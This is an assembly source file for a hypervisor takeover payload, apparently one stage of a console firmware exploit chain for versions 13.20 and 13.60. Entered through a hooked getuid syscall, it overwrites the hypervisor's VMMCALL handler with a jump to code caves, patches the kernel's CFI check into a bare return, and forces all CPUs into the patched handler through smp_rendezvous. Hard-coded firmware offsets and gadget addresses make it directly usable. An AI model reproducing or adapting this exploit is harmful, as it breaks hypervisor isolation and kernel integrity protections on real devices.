/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID+0xE. Inputs (set via kh_set_resume_{rdi,rsi,rdx,rax}):
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *   rdx = continue address (SYS_GETUID+0xE+len) -- where we return to let the
 *         getuid() syscall finish, so the payload can keep running
 *   rax = step selector (PL5_TAKEOVER_STAGE):
 *           0 = do nothing, just return (tests the enter/return path)
 *           1 = patch the VMMCALL handler with the CR3-switch stub
 *           2 = 1 + clear the kernel CFI check byte
 *           3 = 2 + smp_rendezvous(...) -> full takeover (never returns)
 *
 * With NPT already disabled by the pre-suspend break_hv payload, dmap addresses
 * HV physical memory.
 *
 * We patch the *VMMCALL-specific* handler (HV jump-table target), not the
 * general VMEXIT dispatcher entry: the dispatcher fires for every exit reason
 * and patching it hands the first unrelated exit to shellcode_hv, which then
 * spins for rendezvous peers that never arrive.
 *
 * The rendezvous action is the kernel's own hypercall-4 wrapper
 * (`mov eax,4; vmmcall; ret`); RAX != 0x17 avoids the dispatcher's
 * guest-RAX==0x17 fast path we do not patch.
 *
 * All callee-saved GPRs (rbx, rbp, r12-r15) are preserved so the interrupted
 * getuid() syscall resumes ABI-correctly. Caller-saved regs are free to clobber.
 *
 * ---------------------------------------------------------------------------
 * FIRMWARE PARAMETERIZATION
 *
 * Every firmware-specific constant lives in exactly one place below, selected
 * by PL5_TAKEOVER_FW (set by ./Makefile; the main Makefile forwards it to both
 * this blob and its C consumers). The instruction body references only the
 * macro names -- no literal firmware address may appear after the
 * "end firmware config" marker (tools/verify_takeover_param.py enforces this).
 *
 * A firmware whose values are not all known must fail the build here rather
 * than silently fall back to another firmware's constants: that fallback is
 * exactly the 13.20 contamination this split removes.
 * ---------------------------------------------------------------------------
 */
/* --- firmware config (the only place firmware addresses may appear) --- */
#ifndef PL5_TAKEOVER_FW
#define PL5_TAKEOVER_FW 1320
#endif

#if PL5_TAKEOVER_FW == 1320

#define HV_VMMCALL_HANDLER_PA  0x62847375  /* HV image, physical */
#define OFF_KERNEL_CFI_CHECK   0x44e5d0    /* off_1320.KERNEL_CFI_CHECK */
#define OFF_GADGET_RET         0x291232    /* off_1320.GAD_RET_TRAMP */
#define OFF_FUN_VMMCALL_HC4    0xc09e40    /* mov eax,4; vmmcall; ret */
#define OFF_FUN_SMP_RENDEZVOUS 0xaf94e0    /* off_1320.FUN_SMP_RENDEZVOUS */
#define CAVE_HV_PAGING         0x100000000
#define CAVE_HV_CODE           0x100003000

#elif PL5_TAKEOVER_FW == 1360

/* Kernel-side 13.60 values are dump-verified (tools/verify_off_1360_dump.py):
 * CFI 0x44F8C0, smp_rendezvous 0xB04440, hypercall-4 wrapper 0xC16A10,
 * GAD_RET_TRAMP 0x2912A2. The HV VMMCALL handler PA does NOT come from a
 * kernel dump -- it lives in the hypervisor reservation -- so this blob cannot
 * be built for 13.60 yet. Refuse instead of inheriting 0x62847375. */
#define OFF_KERNEL_CFI_CHECK   0x44f8c0
#define OFF_GADGET_RET         0x2912a2
#define OFF_FUN_VMMCALL_HC4    0xc16a10
#define OFF_FUN_SMP_RENDEZVOUS 0xb04440
#define CAVE_HV_PAGING         0x100000000
#define CAVE_HV_CODE           0x100003000
#error "13.60 takeover blob: HV_VMMCALL_HANDLER_PA is unknown (HV-resident; a kernel dump cannot contain it). Derive it via the NPT-alias HV dump before building the blob for 13.60."

#else
#error "PL5_TAKEOVER_FW must be 1320 or 1360"
#endif
/* --- end firmware config --- */

    .section .entry_point,"ax",@progbits
    .global takeover
    .type takeover, @function
takeover:
    push %rbx
    push %rbp
    push %r12
    push %r13
    push %r14
    push %r15
    push %rdx                   /* [rsp] = continue address */
    push %rax                   /* [rsp] = step selector   */

    mov  %rdi, %r12             /* r12 = ktext */
    mov  %rsi, %r13             /* r13 = dmap  */
    mov  %rax, %r14             /* r14 = stage */

    test %r14, %r14
    jz   .Lret

    /* stage >= 1: movabs rax,CAVE_HV_PAGING ; mov cr3,rax ;
     *             movabs rax,CAVE_HV_CODE   ; jmp rax   (25 bytes)
     * written to the SVM VMMCALL handler at dmap + HV_VMMCALL_HANDLER_PA. */
    lea  HV_VMMCALL_HANDLER_PA(%r13), %rdi
    lea  .Lstub(%rip), %rsi
    mov  $25, %ecx
    cld
    rep  movsb

    cmp  $1, %r14
    jbe  .Lret

    /* Clear the kernel CFI check (ktext+OFF_KERNEL_CFI_CHECK -> ret) so the raw
     * function-pointer callbacks pass. */
    movb $0xc3, OFF_KERNEL_CFI_CHECK(%r12)

    cmp  $2, %r14
    jbe  .Lret

    /* smp_rendezvous(setup=ret, action=hc4, teardown=ret, arg=0) */
    lea  OFF_GADGET_RET(%r12), %rdi          /* bare `ret` */
    lea  OFF_FUN_VMMCALL_HC4(%r12), %rsi     /* mov eax,4; vmmcall; ret */
    lea  OFF_GADGET_RET(%r12), %rdx
    xor  %ecx, %ecx
    lea  OFF_FUN_SMP_RENDEZVOUS(%r12), %rax  /* smp_rendezvous */
    call *%rax
    /* falls through only if the rendezvous did not divert us */

.Lret:
    pop  %rax
    pop  %rdx
    pop  %r15
    pop  %r14
    pop  %r13
    pop  %r12
    pop  %rbp
    pop  %rbx
    jmp  *%rdx

.Lstub:
    .byte 0x48, 0xb8
    .quad CAVE_HV_PAGING                /* movabs rax, CAVE_HV_PAGING */
    .byte 0x0f, 0x22, 0xd8              /* mov cr3, rax */
    .byte 0x48, 0xb8
    .quad CAVE_HV_CODE                  /* movabs rax, CAVE_HV_CODE */
    .byte 0xff, 0xe0                    /* jmp rax */
    .size takeover, .-takeover
